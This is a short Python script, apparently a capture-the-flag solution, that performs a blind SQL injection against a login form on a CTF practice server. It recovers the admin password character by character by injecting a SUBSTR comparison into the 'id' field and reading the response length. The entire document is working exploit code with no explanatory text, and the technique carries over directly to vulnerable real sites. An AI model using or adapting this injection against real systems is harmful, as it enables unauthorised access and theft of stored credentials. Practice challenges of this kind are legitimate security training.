#!/usr/bin/env python

import urllib.request
import urllib.parse

url = "http://ctfq.sweetduet.info:10080/~q6/"


def main():
    for i in range(1, 22):
        # crack password with [0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_]
        for char_n in range(48, 123):
            # payload for POST
            flag = chr(char_n)
            payload = {
                "id": "admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {index}, 1) = '{char}' --".format(
                    index=i, char=flag
                ),
                "pass": "",
            }

            # encode utf-8
            post_data = urllib.parse.urlencode(payload).encode("utf-8")
            req = urllib.request.Request(url, post_data)

            # HTTP response
            res = urllib.request.urlopen(req)
            if int(res.headers["content-length"]) > 2000:
                print(flag, end="")
                break
    print()


if __name__ == "__main__":
    main()
